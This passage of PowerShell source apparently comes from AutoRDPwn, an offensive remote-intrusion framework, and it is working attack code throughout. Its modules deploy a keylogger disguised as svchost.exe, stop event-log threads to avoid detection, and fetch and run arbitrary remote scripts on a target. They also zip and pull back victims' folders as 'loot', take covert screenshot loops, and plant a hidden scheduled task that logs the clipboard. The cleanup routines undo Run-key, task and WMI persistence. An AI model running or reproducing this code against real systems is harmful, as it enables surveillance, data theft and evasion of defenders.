        $remoteHost = Join-Path $remoteDirectory 'svchost.exe'
        Copy-ARFileToTarget -LocalPath $localDll -RemotePath $remoteDll | Out-Null
        Copy-ARFileToTarget -LocalPath $localHost -RemotePath $remoteHost | Out-Null
        $script:ARRemoteTempDirs.Add($remoteDirectory)
        $logPath = Invoke-Command -Session $session -ArgumentList $remoteDll, $remoteHost -ScriptBlock {
            param($dll, $hostProcess)
            Get-Process | Where-Object { $_.Path -eq $hostProcess -or $_.Path -like '*\Local\Temp\svchost.exe' } | Stop-Process -Force -ErrorAction SilentlyContinue
            $log = Join-Path $env:LOCALAPPDATA 'config.dat'
            Remove-Item -LiteralPath $log -Force -ErrorAction SilentlyContinue
            Push-Location (Split-Path -Parent $dll)
            try { & $dll nomsg explorer.exe $hostProcess | Out-Null } finally { Pop-Location }
            Start-Sleep -Milliseconds 500
            if (-not (Test-Path -LiteralPath $log)) { New-Item -ItemType File -Path $log -Force | Out-Null }
            return $log
        } -ErrorAction Stop
        if (-not $script:ARModuleFiles.Contains([string]$logPath)) { $script:ARModuleFiles.Add([string]$logPath) }
        Write-ARInfo 'Remote Keylogger | Press Ctrl+C to stop'
        try {
            Invoke-Command -Session $session -ArgumentList $logPath -ScriptBlock {
                param($path)
                Get-Content -LiteralPath $path -Wait
            } | ForEach-Object { Write-Host $_ }
        }
        finally {
            try {
                Invoke-Command -Session $session -ArgumentList $remoteHost -ScriptBlock {
                    param($hostProcess)
                    Get-Process | Where-Object { $_.Path -eq $hostProcess -or $_.Path -like '*\Local\Temp\svchost.exe' } | Stop-Process -Force -ErrorAction SilentlyContinue
                } -ErrorAction SilentlyContinue | Out-Null
            } catch { }
        }
    }
    Set-ARStatus 'Keylogger stopped' 'Ok'
}

function Invoke-ARModuleChachi {
    $result = Invoke-ARTargetPowerShell -RelativePath 'Resources\Scripts\Chachi-Enumerator.ps1' -Function 'Comprueba-Todo'
    Show-ARText $result
    Set-ARStatus 'Enumeration finished' 'Ok'
}

function Invoke-ARModuleSherlock {
    $result = Invoke-ARTargetPowerShell -RelativePath 'Resources\Scripts\Sherlock.ps1' -Function 'Find-AllVulns'
    Show-ARText $result
    Set-ARStatus 'Sherlock finished' 'Ok'
}

function Invoke-ARModulePrivescCheck {
    $result = Invoke-ARTargetPowerShell -RelativePath 'Resources\Scripts\Invoke-PrivescCheck.ps1' -Function 'Invoke-PrivescCheck'
    Show-ARText $result
    Set-ARStatus 'Privilege escalation audit finished' 'Ok'
}

function Invoke-ARModulePhant0m {
    $result = Invoke-ARTargetPowerShell -RelativePath 'Resources\Scripts\Invoke-Phant0m.ps1' -Function 'Invoke-Phant0m'
    Show-ARText $result
    Set-ARStatus 'Event log threads stopped' 'Ok'
}

# Screen access runs over the target-side JPEG frame server and its pull viewer.
# The old route staged a 1.7 MB VNC vendor blob and injected it reflectively;
# that injection dies silently after the GetProcAddress fix, so it is retired.
function Invoke-ARModuleVncServer {
    Invoke-ARAttackQuickScreen
}

function Invoke-ARModuleExternalScript {
    $source = Read-ARValue (Get-ARText 'txt73' 'Enter the path or url of the script')
    $function = Read-ARLineValue (' ' + (Get-ARText 'txt74' 'Write the function you want to execute') + ' [none]: ')
    if ($null -eq $function) { $function = '' } else { $function = $function.Trim() }
    if ($source -match '^https?://') {
        $work = New-ARWorkDirectory
        $localScript = Join-Path $work 'external.ps1'
        Invoke-ARDownload -Url $source -OutFile $localScript
    }
    elseif (Test-Path -LiteralPath $source) {
        $localScript = (Resolve-Path -LiteralPath $source).Path
    }
    else { throw 'The external script could not be found.' }
    if (Test-ARIsLocalTarget) {
        $result = & {
            param($path, $functionName)
            . $path
            if ($functionName -ne '') { Invoke-Expression $functionName }
        } $localScript $function
        Show-ARText $result
    }
    else {
        $session = Get-ARTargetSession
        $remoteDirectory = 'C:\Windows\Temp\AutoRDPwnScript_' + [guid]::NewGuid().ToString('N')
        $remoteScript = Join-Path $remoteDirectory 'external.ps1'
        Copy-ARFileToTarget -LocalPath $localScript -RemotePath $remoteScript | Out-Null
        $script:ARRemoteTempDirs.Add($remoteDirectory)
        $result = Invoke-Command -Session $session -ArgumentList $remoteScript, $function -ScriptBlock {
            param($path, $functionName)
            Push-Location (Split-Path -Parent $path)
            try {
                . $path
                if ($functionName -ne '') { Invoke-Expression $functionName }
            }
            finally { Pop-Location }
        } -ErrorAction Stop
        Show-ARText $result
    }
    Set-ARStatus 'External script executed' 'Ok'
}

function Invoke-ARModuleRunAs {
    if (-not (Test-ARIsLocalTarget)) { throw 'RunAs only works on the local computer.' }
    $user = Read-ARValue (Get-ARText 'txt78' 'Enter the username')
    $plain = Read-ARSecret 'Password'
    Add-Type -AssemblyName System.DirectoryServices.AccountManagement
    $context = New-Object System.DirectoryServices.AccountManagement.PrincipalContext('machine', $env:COMPUTERNAME)
    if (-not $context.ValidateCredentials($user, $plain)) {
        throw (Get-ARText 'txt81' 'Wrong credentials! Returning to the main menu..')
    }
    Import-ARToolScript 'Resources\Scripts\Invoke-RunAs.ps1'
    $executable = Join-Path $script:ARTools 'RunAs.exe'
    if (-not (Test-Path -LiteralPath $executable)) { throw 'RunAs could not be extracted.' }
    & $executable -u $user -p $plain -e 'powershell.exe -NoExit'
    Set-ARStatus 'Process launched as the new user' 'Ok'
}

function Test-ARModuleEscapePressed {
    # Escape drains pending keys; redirected or unavailable console input just
    # reads false so the caller never has to guard KeyAvailable itself.
    try {
        while ([Console]::KeyAvailable) {
            $key = [Console]::ReadKey($true)
            if ($key.Key -eq [System.ConsoleKey]::Escape) { return $true }
        }
    }
    catch { return $false }
    return $false
}

function Wait-ARModuleSeconds {
    # Sleeps in 100 ms slices so Escape stays responsive between long waits.
    param([Parameter(Mandatory = $true)][int]$Seconds)
    if ($Seconds -lt 1) { Start-Sleep -Milliseconds 250; return (Test-ARModuleEscapePressed) }
    $deadline = [DateTime]::Now.AddSeconds([double]$Seconds)
    while ([DateTime]::Now -lt $deadline) {
        if (Test-ARModuleEscapePressed) { return $true }
        Start-Sleep -Milliseconds 100
    }
    return $false
}

function New-ARModuleToken {
    # Uppercase hex cut from a guid: unique per run by construction.
    param([int]$Length = 8)
    $token = [guid]::NewGuid().ToString('N').ToUpperInvariant()
    return $token.Substring(0, [Math]::Min($Length, $token.Length))
}

function Get-ARModuleDetailPath {
    # Ledger details are flat "key: value; key: value" strings; paths written
    # by the machine (windows paths, guids) never contain quotes, so the lazy
    # match up to the next separator is exact.
    param([string]$Detail, [string]$Label)
    if ([string]::IsNullOrWhiteSpace($Detail)) { return '' }
    $regex = [regex]::Escape($Label) + ':\s*([^;]+?)(?:;|$)'
    $match = [regex]::Match($Detail, $regex)
    if ($match.Success) { return $match.Groups[1].Value.Trim() }
    return ''
}

function Remove-ARPersistenceItems {
    # Shared by the persistence kit (-Remove) and by Remove-ARModuleArtifacts
    # at session end: exact ledger entries first, then leftover AutoRDPwn
    # shapes when -IncludeUnknown is set. Returns how many artifacts were
    # found and removed (one per recorded entry; sweeps count one per batch).
    param(
        [object[]]$Items = @(),
        [switch]$IncludeUnknown
    )
    $removed = 0
    $ledgerItems = @($Items)
    $runKey = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'

    # 1) HKCU run values recorded by the kit, plus the heartbeat process and
    #    its staged files. Names are random per run, so removal repeats safely.
    foreach ($item in $ledgerItems) {
        if ([string]$item.Kind -ne 'Run') { continue }
        $runName = [string]$item.Name
        $scriptPath = Get-ARModuleDetailPath -Detail ([string]$item.Detail) -Label 'script'
        $logPath = Get-ARModuleDetailPath -Detail ([string]$item.Detail) -Label 'log'
        try {
            $hadValue = [bool](Invoke-ARTargetCommand -ScriptBlock {
                param($key, $name, $payloadPath, $logPath)
                if ($payloadPath -ne '' -or $logPath -ne '') {
                    Get-CimInstance Win32_Process -Filter "Name = 'powershell.exe'" -ErrorAction SilentlyContinue |
                        Where-Object {
                            if (-not $_.CommandLine) { return $false }
                            return (($payloadPath -ne '' -and $_.CommandLine.Contains($payloadPath)) -or ($logPath -ne '' -and $_.CommandLine.Contains($logPath)))
                        } |
                        ForEach-Object { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }
                }
                if ($payloadPath -ne '') { Remove-Item -LiteralPath $payloadPath -Force -ErrorAction SilentlyContinue }
                if ($logPath -ne '') { Remove-Item -LiteralPath $logPath -Force -ErrorAction SilentlyContinue }
                $registryItem = Get-Item -LiteralPath $key -ErrorAction SilentlyContinue
                if ($null -eq $registryItem) { return $false }
                if ($null -eq $registryItem.GetValue($name)) { return $false }
                Remove-ItemProperty -Path $key -Name $name -Force -ErrorAction SilentlyContinue
                return $true
            } -ArgumentList $runKey, $runName, $scriptPath, $logPath)
            if ($hadValue) {
                $removed++
                Write-ARSuccess ('Removed run value: ' + $runName)
            }
        }
        catch { Write-ARWarn ('Run value removal incomplete: ' + $_.Exception.Message) }
    }

    # 2) Logon tasks recorded by the kit: end the run, kill the payload
    #    process, drop the staged script, unregister the task.
    foreach ($item in $ledgerItems) {
        if ([string]$item.Kind -ne 'Task') { continue }
        $taskName = [string]$item.Name
        $scriptPath = Get-ARModuleDetailPath -Detail ([string]$item.Detail) -Label 'script'
        try {
            $taskStatus = [bool](Invoke-ARTargetCommand -ScriptBlock {
                param($name, $payloadPath)
                $found = ($null -ne (Get-ScheduledTask -TaskName $name -ErrorAction SilentlyContinue))
                & schtasks.exe /end /tn $name 2>&1 | Out-Null
                if ($payloadPath -ne '') {
                    Get-CimInstance Win32_Process -Filter "Name = 'powershell.exe'" -ErrorAction SilentlyContinue |
                        Where-Object { $_.CommandLine -and $_.CommandLine.Contains($payloadPath) } |
                        ForEach-Object { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }
                    Remove-Item -LiteralPath $payloadPath -Force -ErrorAction SilentlyContinue
                }
                Unregister-ScheduledTask -TaskName $name -Confirm:$false -ErrorAction SilentlyContinue
                return $found
            } -ArgumentList $taskName, $scriptPath)
            if ($taskStatus) {
                $removed++
                Write-ARSuccess ('Removed logon task: ' + $taskName)
            }
            if (Get-Variable -Name ARRemoteTasks -Scope Script -ErrorAction SilentlyContinue) { [void]$script:ARRemoteTasks.Remove($taskName) }
        }
        catch { Write-ARWarn ('Task removal incomplete: ' + $_.Exception.Message) }
    }

    # 3) WMI trios recorded by the kit: kill anything still running from the
    #    bound command line, then drop bindings before consumers and filters.
    foreach ($item in $ledgerItems) {
        if ([string]$item.Kind -ne 'Wmi') { continue }
        $filterName = [string]$item.Name
        $consumerName = Get-ARModuleDetailPath -Detail ([string]$item.Detail) -Label 'consumer'
        if ($consumerName -eq '') { $consumerName = $filterName -replace 'AutoRDPwnF', 'AutoRDPwnC' }
        $payloadPath = Get-ARModuleDetailPath -Detail ([string]$item.Detail) -Label 'script'
        try {
            $wmiStatus = Invoke-ARTargetCommand -ScriptBlock {
                param($filterName, $consumerName, $payloadPath)
                if ($payloadPath -ne '') {
                    Get-CimInstance Win32_Process -Filter "Name = 'powershell.exe'" -ErrorAction SilentlyContinue |
                        Where-Object { $_.CommandLine -and $_.CommandLine.Contains($payloadPath) } |
                        ForEach-Object { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }
                }
                $stats = @{ Filter = $false; Consumer = $false }
                $bindings = @(Get-WmiObject -Namespace 'root\subscription' -Class '__FilterToConsumerBinding' -ErrorAction SilentlyContinue)
                foreach ($binding in $bindings) {
                    $references = [string]$binding.Filter + ' ' + [string]$binding.Consumer
                    if ($references.Contains(('Name="' + $filterName + '"')) -or $references.Contains(('Name="' + $consumerName + '"'))) {
                        Remove-WmiObject -InputObject $binding -ErrorAction SilentlyContinue
                    }
                }
                $consumers = @(Get-WmiObject -Namespace 'root\subscription' -Class 'CommandLineEventConsumer' -ErrorAction SilentlyContinue | Where-Object { [string]$_.Name -eq $consumerName })
                foreach ($consumer in $consumers) { $stats.Consumer = $true; Remove-WmiObject -InputObject $consumer -ErrorAction SilentlyContinue }
                $filters = @(Get-WmiObject -Namespace 'root\subscription' -Class '__EventFilter' -ErrorAction SilentlyContinue | Where-Object { [string]$_.Name -eq $filterName })
                foreach ($filterObject in $filters) { $stats.Filter = $true; Remove-WmiObject -InputObject $filterObject -ErrorAction SilentlyContinue }
                return $stats
            } -ArgumentList $filterName, $consumerName, $payloadPath
            if ($wmiStatus.Filter -or $wmiStatus.Consumer) {
                $removed++
                Write-ARSuccess ('Removed WMI subscription: ' + $filterName + ' / ' + $consumerName)
            }
        }
        catch { Write-ARWarn ('WMI subscription removal incomplete: ' + $_.Exception.Message) }
    }

    if ($IncludeUnknown) {
        # Interrupted installs leave shapes behind; the sweep uses the same
        # prefixes and patterns Remove-ARTargetArtifacts already recognizes,
        # so both gates agree on what belongs to this tool.
        try {
            $sweepRun = @(Invoke-ARTargetCommand -ScriptBlock {
                param($key)
                $names = @()
                $registryItem = Get-Item -LiteralPath $key -ErrorAction SilentlyContinue
                if ($null -ne $registryItem) {
                    foreach ($valueName in $registryItem.GetValueNames()) {
                        if ($valueName -like 'ARDP_*') {
                            Remove-ItemProperty -Path $key -Name $valueName -Force -ErrorAction SilentlyContinue
                            $names += $valueName
                        }
                    }
                }
                return $names
            } -ArgumentList $runKey)
            foreach ($valueName in $sweepRun) {
                $removed++
                Write-ARSuccess ('Removed leftover run value: ' + $valueName)
            }
        }
        catch { Write-ARWarn ('Run value sweep incomplete: ' + $_.Exception.Message) }

        try {
            $sweepTasks = @(Invoke-ARTargetCommand -ScriptBlock {
                $names = @()
                $tasks = @(Get-ScheduledTask -ErrorAction SilentlyContinue | Where-Object {
                    $nameMatch = ($_.TaskName -match '^AutoRDPwn[A-F0-9]{6}$')
                    if (-not $nameMatch -and $_.TaskName -match '^W[0-9A-F]{8}$') {
                        $actionText = ''
                        foreach ($action in $_.Actions) { $actionText += [string]$action.Execute + ' ' + [string]$action.Arguments + ' ' }
                        if ($actionText -match 'Windows\\Temp\\W[0-9A-F]{8}\.ps1') { $nameMatch = $true }
                    }
                    return $nameMatch
                })
                foreach ($task in $tasks) {
                    $payloadPath = ''
                    foreach ($action in $task.Actions) {
                        $pathMatch = [regex]::Match(([string]$action.Execute + ' ' + [string]$action.Arguments), 'C:\\Windows\\Temp\\W[0-9A-F]{8}\.ps1')
                        if ($pathMatch.Success) { $payloadPath = $pathMatch.Value; break }
                    }
                    if ($payloadPath -ne '') {
                        Get-CimInstance Win32_Process -Filter "Name = 'powershell.exe'" -ErrorAction SilentlyContinue |
                            Where-Object { $_.CommandLine -and $_.CommandLine.Contains($payloadPath) } |
                            ForEach-Object { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }
                        Remove-Item -LiteralPath $payloadPath -Force -ErrorAction SilentlyContinue
                    }
                    & schtasks.exe /end /tn $task.TaskName 2>&1 | Out-Null
                    Unregister-ScheduledTask -TaskName $task.TaskName -Confirm:$false -ErrorAction SilentlyContinue
                    $names += $task.TaskName
                }
                return $names
            })
            foreach ($taskName in $sweepTasks) {
                $removed++
                Write-ARSuccess ('Removed leftover task: ' + $taskName)
            }
        }
        catch { Write-ARWarn ('Task sweep incomplete: ' + $_.Exception.Message) }

        try {
            $sweepWmi = Invoke-ARTargetCommand -ScriptBlock {
                $stats = @{ Filters = 0; Consumers = 0 }
                $bindings = @(Get-WmiObject -Namespace 'root\subscription' -Class '__FilterToConsumerBinding' -ErrorAction SilentlyContinue)
                foreach ($binding in $bindings) {
                    $references = [string]$binding.Filter + ' ' + [string]$binding.Consumer
                    if ($references -like '*AutoRDPwnF*' -or $references -like '*AutoRDPwnC*') {
                        Remove-WmiObject -InputObject $binding -ErrorAction SilentlyContinue
                    }
                }
                $consumers = @(Get-WmiObject -Namespace 'root\subscription' -Class 'CommandLineEventConsumer' -ErrorAction SilentlyContinue | Where-Object { [string]$_.Name -like 'AutoRDPwnC*' })
                foreach ($consumer in $consumers) { $stats.Consumers = $stats.Consumers + 1; Remove-WmiObject -InputObject $consumer -ErrorAction SilentlyContinue }
                $filters = @(Get-WmiObject -Namespace 'root\subscription' -Class '__EventFilter' -ErrorAction SilentlyContinue | Where-Object { [string]$_.Name -like 'AutoRDPwnF*' })
                foreach ($filterObject in $filters) { $stats.Filters = $stats.Filters + 1; Remove-WmiObject -InputObject $filterObject -ErrorAction SilentlyContinue }
                return $stats
            }
            $sweepWmiTotal = [int]$sweepWmi.Filters + [int]$sweepWmi.Consumers
            if ($sweepWmiTotal -gt 0) {
                $removed++
                Write-ARSuccess ('Removed leftover WMI objects: ' + $sweepWmiTotal)
            }
        }
        catch { Write-ARWarn ('WMI sweep incomplete: ' + $_.Exception.Message) }
    }

    return $removed
}

function Invoke-ARModuleFileExfil {
    $target = Get-ARTargetComputer
    $folder = Read-ARValue 'Remote folder to collect' ''
    if ([string]::IsNullOrWhiteSpace($folder)) { Write-ARWarn 'No folder was provided.'; return }
    $stamp = Get-Date -Format 'yyyyMMdd-HHmmss'
    $safeTarget = $target -replace '[\\/:*?"<>|]', '_'
    $lootDirectory = Get-ARLootDirectory 'exfil'
    $localZip = Join-Path $lootDirectory ($safeTarget + '-' + $stamp + '.zip')
    # ZipFile needs this assembly loaded before OpenRead.
    try { Add-Type -AssemblyName System.IO.Compression.FileSystem } catch { }
    try {
        if (Test-ARIsLocalTarget) {
            # Local collection lands straight in the loot folder: no staging
            # roundtrip, nothing left for the cleanup gate to walk.
            Compress-Archive -Path (Join-Path $folder '*') -DestinationPath $localZip -Force -ErrorAction Stop
            $archive = [System.IO.Compression.ZipFile]::OpenRead($localZip)
            try { $entries = $archive.Entries.Count } finally { $archive.Dispose() }
            $megabytes = [Math]::Round((Get-Item -LiteralPath $localZip).Length / 1MB, 2)
            Write-ARSuccess ('Loot saved to ' + $localZip + ' (' + $entries + ' entries, ' + $megabytes + ' MB)')
            Set-ARStatus 'Folder collected' 'Ok'
            return
        }
        $session = Get-ARTargetSession
        $remoteZip = Join-Path 'C:\Windows\Temp' (New-ARRemoteTempName '.zip')
        if (-not $script:ARModuleFiles.Contains($remoteZip)) { $script:ARModuleFiles.Add($remoteZip) }
        try {
            $exists = [bool](Invoke-ARTargetCommand -ScriptBlock { param($path) Test-Path -LiteralPath $path } -ArgumentList $folder)
            if (-not $exists) { Write-ARWarn ('The folder does not exist on the target: ' + $folder); return }
            Invoke-ARTargetCommand -ScriptBlock {
                param($folderPath, $archivePath)
                Compress-Archive -Path (Join-Path $folderPath '*') -DestinationPath $archivePath -Force -ErrorAction Stop
            } -ArgumentList $folder, $remoteZip | Out-Null
            Receive-ARFileFromTarget -RemotePath $remoteZip -LocalPath $localZip -Session $session | Out-Null
            $archive = [System.IO.Compression.ZipFile]::OpenRead($localZip)
            try { $entries = $archive.Entries.Count } finally { $archive.Dispose() }
            $megabytes = [Math]::Round((Get-Item -LiteralPath $localZip).Length / 1MB, 2)
            Write-ARSuccess ('Loot saved to ' + $localZip + ' (' + $entries + ' entries, ' + $megabytes + ' MB)')
            Set-ARStatus 'Folder exfiltrated' 'Ok'
        }
        finally {
            # The staged archive dies with the run even when the pull failed.
            try {
                Invoke-ARTargetCommand -ScriptBlock { param($path) Remove-Item -LiteralPath $path -Force -ErrorAction SilentlyContinue } -ArgumentList $remoteZip | Out-Null
            } catch { }
            [void]$script:ARModuleFiles.Remove($remoteZip)
        }
    }
    catch { Write-ARWarn ('Folder collection failed: ' + $_.Exception.Message) }
}

function Invoke-ARModuleScreenshotLoop {
    $target = Get-ARTargetComputer
    Assert-ARPort -Computer $target -Port 5985 -Purpose 'Screenshot loop'
    $frames = 0
    [void][int]::TryParse((Read-ARValue 'Frames' '10'), [ref]$frames)
    if ($frames -lt 1) { $frames = 10 }
    $interval = 0
    [void][int]::TryParse((Read-ARValue 'Seconds between frames' '5'), [ref]$interval)
    if ($interval -lt 1) { $interval = 5 }
    $stamp = Get-Date -Format 'yyyyMMdd-HHmmss'
    $safeTarget = $target -replace '[\\/:*?"<>|]', '_'
    $captureFolder = Join-Path (Get-ARLootDirectory 'shots') ($safeTarget + '-' + $stamp)
    New-Item -ItemType Directory -Path $captureFolder -Force | Out-Null
    $shotPath = Join-Path $script:ARTools 'stealthshot.png'
    $userTarget = [string]$script:ARTarget['User']
    if ([string]::IsNullOrWhiteSpace($userTarget)) {
        $userTarget = Read-ARValue 'Target user' $env:USERNAME
        $script:ARTarget['User'] = $userTarget
    }
    $password = Get-ARPlainPassword
    . (Get-ARResourcePath 'Resources\Scripts\Invoke-StealthScreen.ps1')
    $frameCount = 0
    try {
        for ($index = 1; $index -le $frames; $index++) {
            # Each frame rides the stealth screen shot route: it stages a
            # one-shot capture task in the console session, pulls the png back
            # and tears its task, script and rules down before returning.
            # Invoke-Item pops a viewer on the png once - an accepted quirk of
            # reusing the route instead of editing its script.
            Invoke-StealthScreen -Target $target -User $userTarget -Pass $password -Mode shot
            if (-not (Test-Path -LiteralPath $shotPath)) { Write-ARWarn 'No screenshot arrived from the target.'; break }
            $frameFile = Join-Path $captureFolder (('frame-{0:d3}.jpg' -f $index))
            $moved = $false
            for ($attempt = 0; $attempt -lt 20 -and -not $moved; $attempt++) {
                try {
                    Move-Item -LiteralPath $shotPath -Destination $frameFile -Force -ErrorAction Stop
                    $moved = $true
                }
                catch { Start-Sleep -Milliseconds 250 }
            }
            if (-not $moved) {
                # A photo viewer may still hold the png open: copy anyway.
                Copy-Item -LiteralPath $shotPath -Destination $frameFile -Force
                Remove-Item -LiteralPath $shotPath -Force -ErrorAction SilentlyContinue
            }
            $frameCount++
            Write-Host ('  saved ' + (Split-Path -Leaf $frameFile) + ' (' + [Math]::Round((Get-Item -LiteralPath $frameFile).Length / 1KB, 1) + ' KB)') -ForegroundColor Gray
            if ($index -lt $frames) {
                Write-ARProgress -Activity 'Screenshot loop' -Percent ([int](($index * 100) / $frames)) -Status ('frame ' + $index + ' of ' + $frames + ' - Escape stops')
                if (Wait-ARModuleSeconds -Seconds $interval) { Write-ARInfo 'Escape pressed - screenshot loop stopped early.'; break }
            }
        }
    }
    finally {
        # An empty capture folder means nothing was collected: remove it so
        # the loot tree only ever holds real evidence.
        $leftovers = @(Get-ChildItem -LiteralPath $captureFolder -Force -ErrorAction SilentlyContinue)
        if ($leftovers.Count -eq 0) { Remove-Item -LiteralPath $captureFolder -Force -ErrorAction SilentlyContinue }
    }
    Set-ARStatus ('Screenshot loop finished - ' + $frameCount + ' frame(s) in ' + $captureFolder) 'Ok'
}

function Invoke-ARModuleClipboardWatch {
    # The watcher runs as a scheduled task with the logged-on user as the
    # principal, the same technique the stealth screen route uses: clipboard
    # state only exists inside the interactive session. Payload loop is
    # terminated from outside (schtasks /end or kill), so it needs no stop file.
    $taskName = New-ARRemoteTempName
    $scriptPath = Join-Path 'C:\Windows\Temp' ($taskName + '.ps1')
    $logPath = Join-Path 'C:\Windows\Temp' (New-ARRemoteTempName '.txt')
    $template = @'
$ErrorActionPreference = 'SilentlyContinue'
$log = '__LOGPATH__'
$seen = New-Object System.Collections.Generic.HashSet[string]
while ($true) {
    try {
        $text = Get-Clipboard -Raw
        if (-not [string]::IsNullOrEmpty($text)) {
            if (-not $seen.Contains($text)) {
                $null = $seen.Add($text)
                [System.IO.File]::AppendAllText($log, ('[' + (Get-Date -Format 'yyyy-MM-dd HH:mm:ss') + '] ' + $text + "`r`n"), [System.Text.Encoding]::UTF8)
            }
        }
    }
    catch { }
    Start-Sleep -Seconds 2
}
'@
    try {
        try {
            $work = New-ARWorkDirectory
            $localPayload = Join-Path $work ($taskName + '.ps1')
            [System.IO.File]::WriteAllText($localPayload, $template.Replace('__LOGPATH__', $logPath), [System.Text.Encoding]::UTF8)
            Copy-ARFileToTarget -LocalPath $localPayload -RemotePath $scriptPath | Out-Null
            if (-not $script:ARModuleFiles.Contains($scriptPath)) { $script:ARModuleFiles.Add($scriptPath) }
            if (-not $script:ARModuleFiles.Contains($logPath)) { $script:ARModuleFiles.Add($logPath) }
            Invoke-ARTargetCommand -ScriptBlock {
                param($name, $path, $userName)
                $userId = $userName
                if ($userId -and $userId -notmatch '\\') { $userId = $env:COMPUTERNAME + '\' + $userId }
                if ([string]::IsNullOrWhiteSpace($userId)) { $userId = $env:USERDOMAIN + '\' + $env:USERNAME }
                $action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument ('-nop -w hidden -ep bypass -f "' + $path + '"')
                $principal = New-ScheduledTaskPrincipal -UserId $userId -LogonType Interactive -RunLevel Highest
                Register-ScheduledTask -TaskName $name -Action $action -Principal $principal -Force -ErrorAction Stop | Out-Null
                Start-ScheduledTask -TaskName $name -ErrorAction Stop
            } -ArgumentList $taskName, $scriptPath, ([string]$script:ARTarget['User']) | Out-Null
            $script:ARRemoteTasks.Add($taskName)
            Write-ARSuccess ('Clipboard watcher staged and started (' + $taskName + ').')
            $poll = 0
            [void][int]::TryParse((Read-ARValue 'Seconds between polls' '5'), [ref]$poll)
            if ($poll -lt 1) { $poll = 5 }
            Write-ARInfo 'Clipboard watch running - Escape stops it.'
            $cursor = 0
            # The log is read whole and sliced by the previous length: reading
            # incrementally over a file the task appends to is not possible
            # without a second remote state file.
            while ($true) {
                $stopped = Wait-ARModuleSeconds -Seconds $poll
                $text = ''
                try {
                    $text = [string](Invoke-ARTargetCommand -ScriptBlock {
                        param($log)
                        if (-not (Test-Path -LiteralPath $log)) { return '' }
                        return [System.IO.File]::ReadAllText($log, [System.Text.Encoding]::UTF8)
                    } -ArgumentList $logPath)
                }
                catch { }
                if ($text.Length -lt $cursor) { $cursor = 0 }
                if ($text.Length -gt $cursor) {
                    $newText = $text.Substring($cursor)
                    $cursor = $text.Length
                    foreach ($line in ($newText -split "`r?`n")) {
                        $entry = $line.Trim()
                        if ($entry -ne '') { Write-Host ('  clipboard: ' + $entry) -ForegroundColor Gray }
                    }
                }
                if ($stopped) { Write-ARInfo 'Escape pressed - clipboard watch stopped.'; break }
            }
        }
        finally {
            # End the run, kill the payload process, unregister, delete both
            # files, and tidy the session lists so the later sweep finds nothing.
            try {
                Invoke-ARTargetCommand -ScriptBlock {
                    param($name, $path, $log)
                    & schtasks.exe /end /tn $name 2>&1 | Out-Null
                    Get-CimInstance Win32_Process -Filter "Name = 'powershell.exe'" -ErrorAction SilentlyContinue |
                        Where-Object { $_.CommandLine -and $_.CommandLine.Contains($path) } |
                        ForEach-Object { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }
                    Unregister-ScheduledTask -TaskName $name -Confirm:$false -ErrorAction SilentlyContinue
                    Remove-Item -LiteralPath $path, $log -Force -ErrorAction SilentlyContinue
                } -ArgumentList $taskName, $scriptPath, $logPath | Out-Null
            }
            catch { }
            [void]$script:ARRemoteTasks.Remove($taskName)
            [void]$script:ARModuleFiles.Remove($scriptPath)
            [void]$script:ARModuleFiles.Remove($logPath)
        }
        Set-ARStatus 'Clipboard watch stopped' 'Ok'
    }
    catch { Write-ARWarn ('Clipboard watch failed: ' + $_.Exception.Message) }
}

function Invoke-ARModuleKeyloggerFast {
    $target = Get-ARTargetComputer
    # Payload bytes load exactly like the blocking keylogger module; only the
    # monitoring loop differs (pull + mirror at a byte offset, Escape to stop).
    $scriptPath = Get-ARResourcePath 'Resources\Scripts\Invoke-Keylogger.ps1'
    Push-Location $script:ARTools
    try { . $scriptPath; $first = $Content1; $second = $Content2 } finally { Pop-Location }
    if (-not $first -or -not $second) { throw 'The keylogger payload could not be loaded.' }
    $stamp = Get-Date -Format 'yyyyMMdd-HHmmss'
    $safeTarget = $target -replace '[\\/:*?"<>|]', '_'
    $mirrorLog = Join-Path (Get-ARLootDirectory 'keys') ($safeTarget + '-' + $stamp + '.log')
    $work = New-ARWorkDirectory
    $localDll = Join-Path $work 'dllhost.exe'
    $localHostExe = Join-Path $work 'svchost.exe'
    [System.IO.File]::WriteAllBytes($localDll, $first)
    [System.IO.File]::WriteAllBytes($localHostExe, $second)
    $pullFile = Join-Path $work 'config.dat'
    $logPath = ''
    $remoteDirectory = ''
    $remoteHost = ''
    try {
        if (Test-ARIsLocalTarget) {
            $logPath = Join-Path $env:LOCALAPPDATA 'config.dat'
            Get-Process | Where-Object { $_.Path -eq $localHostExe -or $_.Path -like '*\AutoRDPwnKey_*\svchost.exe' } | Stop-Process -Force -ErrorAction SilentlyContinue
            Remove-Item -LiteralPath $logPath -Force -ErrorAction SilentlyContinue
            if (-not $script:ARModuleFiles.Contains($logPath)) { $script:ARModuleFiles.Add($logPath) }
            Push-Location $work
            try { & $localDll nomsg explorer.exe $localHostExe | Out-Null } finally { Pop-Location }
            Start-Sleep -Milliseconds 500
            if (-not (Test-Path -LiteralPath $logPath)) { New-Item -ItemType File -Path $logPath -Force | Out-Null }
        }
        else {
            $remoteDirectory = 'C:\Windows\Temp\AutoRDPwnKey_' + [guid]::NewGuid().ToString('N')
            $remoteHost = Join-Path $remoteDirectory 'svchost.exe'
            Copy-ARFileToTarget -LocalPath $localDll -RemotePath (Join-Path $remoteDirectory 'dllhost.exe') | Out-Null
            Copy-ARFileToTarget -LocalPath $localHostExe -RemotePath $remoteHost | Out-Null
            $script:ARRemoteTempDirs.Add($remoteDirectory)
            $logPath = [string](Invoke-ARTargetCommand -ScriptBlock {
                param($dll, $hostProcess)
                Get-Process | Where-Object { $_.Path -eq $hostProcess -or $_.Path -like '*\AutoRDPwnKey_*\svchost.exe' } | Stop-Process -Force -ErrorAction SilentlyContinue
                $log = Join-Path $env:LOCALAPPDATA 'config.dat'
                Remove-Item -LiteralPath $log -Force -ErrorAction SilentlyContinue
                Push-Location (Split-Path -Parent $dll)
                try { & $dll nomsg explorer.exe $hostProcess | Out-Null } finally { Pop-Location }
                Start-Sleep -Milliseconds 500
                if (-not (Test-Path -LiteralPath $log)) { New-Item -ItemType File -Path $log -Force | Out-Null }
                return $log
